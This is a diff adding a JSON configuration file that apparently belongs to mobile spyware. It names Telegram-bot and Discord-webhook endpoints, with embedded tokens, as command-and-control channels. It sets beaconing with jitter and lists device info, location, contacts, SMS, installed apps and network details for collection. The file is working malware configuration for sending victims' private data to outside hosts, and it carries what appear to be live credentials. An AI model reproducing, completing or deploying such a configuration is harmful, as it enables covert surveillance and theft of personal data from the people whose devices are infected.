@@ -1,0 +1,23 @@
+{
+  "c2_servers": [
+    {
+      "type": "telegram",
+      "url": "https://api.telegram.org/bot8283973635:AAFzNIcEl78aH-l0iKj5lYKFLj4Vil39u7k/sendMessage",
+      "chat_id": "3032183658"
+    },
+    {
+      "type": "discord",
+      "url": "https://discord.com/api/webhooks/1417361152371064902/DEw6e804zQB6oLB2jWuLvkTPhzMn6aQvsP-GV75mnOY1TWBmAuI9T1H7b9MoGJTSSbmM"
+    }
+  ],
+  "beacon_interval": 300,
+  "jitter": 0.2,
+  "collect_data": [
+    "device_info",
+    "location",
+    "contacts",
+    "sms",
+    "installed_apps",
+    "network_info"
+  ]
+}
